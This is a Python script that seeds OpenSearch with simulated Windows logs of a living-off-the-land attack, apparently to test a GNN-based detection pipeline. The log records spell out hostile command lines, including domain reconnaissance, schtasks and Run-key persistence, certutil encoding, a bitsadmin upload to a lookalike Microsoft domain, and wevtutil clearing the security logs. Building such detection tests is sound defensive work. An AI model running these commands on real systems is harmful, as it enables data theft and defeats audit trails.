"""
inject_lotl_stealth.py
======================
Living-off-the-Land (LotL) attack simulation.

Design goals:
  1. NO sentinel_group_id, NO pre-built incidents — raw ECS logs only.
  2. Uses ONLY Windows built-in binaries (wmic, schtasks, certutil, bitsadmin,
     reg, nltest, net, wevtutil) — each individually looks like helpdesk work.
  3. Events are grouped into OpenSearch via process_tree_id (a Windows logon
     session GUID), which the SchemaMapper will use as the subgraph group key.
  4. Three separate "session" subtrees: Discovery → Staging → Exfil/Cover.
     Each session is assigned its own logon GUID so the graph_builder gets
     three independently scored subgraphs.
  5. Timestamps are spread across the LAST 90 minutes so each cycle of the
     orchestrator's 2-hour window will ingest them together, but the temporal
     spread tells the story of a slow, patient attack.

Expected pipeline behavior:
  - graph_builder groups each session into its own subgraph (3-7 nodes each).
  - GNN encodes the subgraphs; the triple ensemble scores them.
  - The certutil+bitsadmin+wevtutil session should fire the anomaly detector
    even though every binary is legitimate.
  - The forensic worker's LLM investigator generates an incident report.

Index: logs-* (uses "wazuh-alerts-*" prefix so the orchestrator query matches)
"""

import os
import sys
from datetime import datetime, timezone, timedelta
from opensearchpy import OpenSearch, helpers
from dotenv import load_dotenv

load_dotenv()

HOST  = os.getenv("OPENSEARCH_HOST", "localhost")
PORT  = int(os.getenv("OPENSEARCH_PORT", "9201"))
INDEX = "logs-lotl-stealth"          # matches orchestrator's "logs-*" wildcard

client = OpenSearch(
    hosts=[{"host": HOST, "port": PORT}],
    http_compress=True,
    use_ssl=False,
    verify_certs=False,
    ssl_assert_hostname=False,
    ssl_show_warn=False,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def ts(offset_minutes: float) -> str:
    """Return a UTC ISO timestamp at now() minus <offset_minutes> minutes."""
    t = datetime.now(timezone.utc) - timedelta(minutes=offset_minutes)
    return t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

# Windows logon session GUIDs — one per "actor session".
# These are the process_tree_id values that cluster logs into subgraphs.
SESSION_DISCOVERY = "lotl-disc-4a3f8e12-7b91-4c2d-a5f1-9d0b3e7c8a44"
SESSION_STAGING   = "lotl-stag-2c1e9d34-5a6f-4b8e-b7c3-1f0a2d4e6c87"
SESSION_EXFIL     = "lotl-exfl-8d5b2a7f-3c4e-4d9b-a6f2-7e1c5b9d0a3f"

HOST_NAME    = "CORP-WS-042"
HOST_IP      = "10.10.5.42"
USER         = "CORP\\helpdesk01"
DOMAIN       = "CORP"

# ---------------------------------------------------------------------------
# Session A — IT Discovery (T-85 to T-62 minutes)
# Simulates a helpdesk operator doing routine domain health checks.
# Individually each command is normal; together they map the network.
# Subgraph: cmd.exe → systeminfo.exe → net.exe → nltest.exe → arp.exe (5 nodes)
# ---------------------------------------------------------------------------
SESSION_A_LOGS = [
    # Helpdesk opens cmd.exe (normal admin activity)
    {
        "@timestamp":           ts(85),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_DISCOVERY,
        "process.parent.name":  "explorer.exe",
        "process.name":         "cmd.exe",
        "process.pid":          "5412",
        "process.parent.pid":   "3108",
        "CommandLine":          "cmd.exe",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
        "IntegrityLevel":       "Medium",
    },
    # cmd.exe → systeminfo (helpdesk checking OS info before a patch)
    {
        "@timestamp":           ts(82),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_DISCOVERY,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "5412",
        "process.name":         "systeminfo.exe",
        "process.pid":          "7624",
        "CommandLine":          "systeminfo",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # cmd.exe → net.exe user /domain (routine helpdesk task: unlock an AD account)
    {
        "@timestamp":           ts(75),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_DISCOVERY,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "5412",
        "process.name":         "net.exe",
        "process.pid":          "9840",
        "CommandLine":          "net user /domain",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # cmd.exe → nltest (checking DC reachability — unusual for a non-domain admin)
    {
        "@timestamp":           ts(68),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_DISCOVERY,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "5412",
        "process.name":         "nltest.exe",
        "process.pid":          "6032",
        "CommandLine":          "nltest.exe /domain_trusts /all_trusts",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # cmd.exe → arp -a (network neighbor cache — maps internal hosts)
    {
        "@timestamp":           ts(63),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_DISCOVERY,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "5412",
        "process.name":         "arp.exe",
        "process.pid":          "8844",
        "CommandLine":          "arp -a",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # WMI remote query (disguised as helpdesk remote diagnostics)
    {
        "@timestamp":           ts(58),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_DISCOVERY,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "5412",
        "process.name":         "wmic.exe",
        "process.pid":          "7312",
        "CommandLine":          "wmic /node:10.10.5.1 os get caption,version,lastbootuptime",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
]

# ---------------------------------------------------------------------------
# Session B — Staging & Persistence (T-50 to T-30 minutes)
# Disguised as "patch maintenance" — uses schtasks and reg to persist.
# Subgraph: cmd.exe → schtasks.exe → reg.exe → xcopy.exe (4 nodes)
# ---------------------------------------------------------------------------
SESSION_B_LOGS = [
    {
        "@timestamp":           ts(50),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_STAGING,
        "process.parent.name":  "explorer.exe",
        "process.name":         "cmd.exe",
        "process.pid":          "2988",
        "process.parent.pid":   "3108",
        "CommandLine":          "cmd.exe /k",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
        "IntegrityLevel":       "High",
    },
    # schtasks /create — looks like a Windows Update maintenance window
    {
        "@timestamp":           ts(46),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_STAGING,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "2988",
        "process.name":         "schtasks.exe",
        "process.pid":          "4712",
        "CommandLine":          (
            "schtasks.exe /create /sc onlogon /tn \"WindowsUpdateCheck\" "
            "/tr \"C:\\ProgramData\\MicrosoftUpdate\\WinUpd.exe\" /ru SYSTEM /f"
        ),
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # reg add for Run key persistence — disguised as a monitoring agent install
    {
        "@timestamp":           ts(40),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_STAGING,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "2988",
        "process.name":         "reg.exe",
        "process.pid":          "5128",
        "CommandLine":          (
            "reg.exe add "
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run "
            "/v \"SupportAgent\" /t REG_SZ "
            "/d \"C:\\ProgramData\\MicrosoftUpdate\\WinUpd.exe\" /f"
        ),
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # xcopy — staging sensitive files disguised as a "backup job"
    {
        "@timestamp":           ts(34),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_STAGING,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "2988",
        "process.name":         "xcopy.exe",
        "process.pid":          "8820",
        "CommandLine":          (
            "xcopy /s /q C:\\Users\\Administrator\\Documents\\* "
            "C:\\ProgramData\\MicrosoftUpdate\\cache\\"
        ),
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # File write: verify the staged directory was created
    {
        "@timestamp":           ts(33),
        "EventID":              "11",
        "event.action":         "file_write",
        "process_tree_id":      SESSION_STAGING,
        "process.name":         "xcopy.exe",
        "process.pid":          "8820",
        "TargetFilename":       "C:\\ProgramData\\MicrosoftUpdate\\cache\\config.dat",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
]

# ---------------------------------------------------------------------------
# Session C — Exfiltration & Cover Tracks (T-22 to T-4 minutes)
# The most anomalous session: certutil + bitsadmin + wevtutil chain.
# This is the session the GNN should flag: these three tools in sequence
# are statistically deviant from benign helpdesk patterns.
# Subgraph: cmd.exe → certutil.exe → bitsadmin.exe → wevtutil.exe (4 nodes)
# ---------------------------------------------------------------------------
SESSION_C_LOGS = [
    {
        "@timestamp":           ts(22),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_EXFIL,
        "process.parent.name":  "explorer.exe",
        "process.name":         "cmd.exe",
        "process.pid":          "6640",
        "process.parent.pid":   "3108",
        "CommandLine":          "cmd.exe",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
        "IntegrityLevel":       "Medium",
    },
    # certutil -encode: base64-encodes the staged cache into a .b64 file
    # (used by attackers to bypass HTTPS inspection filters)
    {
        "@timestamp":           ts(18),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_EXFIL,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "6640",
        "process.name":         "certutil.exe",
        "process.pid":          "9120",
        "CommandLine":          (
            "certutil.exe -encode "
            "C:\\ProgramData\\MicrosoftUpdate\\cache\\config.dat "
            "C:\\ProgramData\\MicrosoftUpdate\\cache\\upd.log"
        ),
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # Certutil writes the encoded output file
    {
        "@timestamp":           ts(17),
        "EventID":              "11",
        "event.action":         "file_write",
        "process_tree_id":      SESSION_EXFIL,
        "process.name":         "certutil.exe",
        "process.pid":          "9120",
        "TargetFilename":       "C:\\ProgramData\\MicrosoftUpdate\\cache\\upd.log",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # bitsadmin /transfer: exfiltrates the file disguised as a Windows Update download
    # (BITS is a legitimate Windows service; EDR rarely blocks it)
    {
        "@timestamp":           ts(12),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_EXFIL,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "6640",
        "process.name":         "bitsadmin.exe",
        "process.pid":          "4408",
        "CommandLine":          (
            "bitsadmin.exe /transfer \"WindowsUpdateTelemetry\" /upload "
            "http://update-telemetry.microsoft.com.cdn-edge.net/submit "
            "C:\\ProgramData\\MicrosoftUpdate\\cache\\upd.log"
        ),
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # Network connection from bitsadmin — connects to a lookalike domain
    {
        "@timestamp":           ts(12),
        "EventID":              "3",
        "event.action":         "network_connect",
        "process_tree_id":      SESSION_EXFIL,
        "process.name":         "svchost.exe",       # BITS requests go through svchost
        "src_ip":               HOST_IP,
        "dst_ip":               "185.220.101.182",   # Known Tor exit node IP
        "dst_port":             80,
        "protocol":             "TCP",
        "bytes_sent":           48234,
        "bytes_received":       1024,
        "user.name":            "NT AUTHORITY\\SYSTEM",
        "host.name":            HOST_NAME,
    },
    # wevtutil cl: clears Windows System and Security event logs to erase tracks
    # This is a HIGH-confidence LotL indicator.
    {
        "@timestamp":           ts(7),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_EXFIL,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "6640",
        "process.name":         "wevtutil.exe",
        "process.pid":          "3356",
        "CommandLine":          "wevtutil.exe cl System",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    {
        "@timestamp":           ts(6),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_EXFIL,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "6640",
        "process.name":         "wevtutil.exe",
        "process.pid":          "3360",
        "CommandLine":          "wevtutil.exe cl Security",
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
    # Final: delete the staged cache to remove artifacts
    {
        "@timestamp":           ts(4),
        "EventID":              "4688",
        "event.action":         "process_create",
        "process_tree_id":      SESSION_EXFIL,
        "process.parent.name":  "cmd.exe",
        "process.parent.pid":   "6640",
        "process.name":         "cmd.exe",
        "process.pid":          "7792",
        "CommandLine":          (
            "cmd.exe /c rmdir /s /q "
            "C:\\ProgramData\\MicrosoftUpdate\\cache\\"
        ),
        "user.name":            USER,
        "host.name":            HOST_NAME,
        "host.ip":              HOST_IP,
    },
]

# ---------------------------------------------------------------------------
# Bulk index
# ---------------------------------------------------------------------------
ALL_LOGS = SESSION_A_LOGS + SESSION_B_LOGS + SESSION_C_LOGS

actions = [{"_index": INDEX, "_source": log} for log in ALL_LOGS]

print(f"[*] Connecting to OpenSearch at {HOST}:{PORT}...")
try:
    if not client.ping():
        print("[!] Cannot reach OpenSearch. Check docker-compose.")
        sys.exit(1)
except Exception as e:
    print(f"[!] Connection error: {e}")
    sys.exit(1)

print(f"[*] Injecting {len(actions)} LotL events into index '{INDEX}'...")
ok, errors = helpers.bulk(client, actions, raise_on_error=False)

print(f"[+] Indexed {ok} documents. Errors: {len(errors)}")
if errors:
    for err in errors[:5]:
        print(f"    - {err}")

print()
print("ATTACK TIMELINE SUMMARY")
print("=" * 60)
sessions = [
    ("A  DISCOVERY  (T-85m to T-62m)", SESSION_A_LOGS),
    ("B  STAGING    (T-50m to T-33m)", SESSION_B_LOGS),
    ("C  EXFIL+COVER (T-22m to T-4m)", SESSION_C_LOGS),
]
for label, logs in sessions:
    print(f"\n  Session {label}")
    for log in logs:
        ts_str = log["@timestamp"][11:19]          # HH:MM:SS
        proc   = log.get("process.name", "svchost.exe")
        cmd    = log.get("CommandLine", log.get("dst_ip", ""))
        cmd    = (cmd[:60] + "...") if len(cmd) > 60 else cmd
        print(f"    {ts_str}  {proc:<20}  {cmd}")

print()
print("[+] All events are within the 2-hour hunt window.")
print("[+] The orchestrator will group them into 3 distinct subgraphs via process_tree_id.")
print("[+] Expected detections: Session C (certutil -> bitsadmin -> wevtutil) is the hot path.")
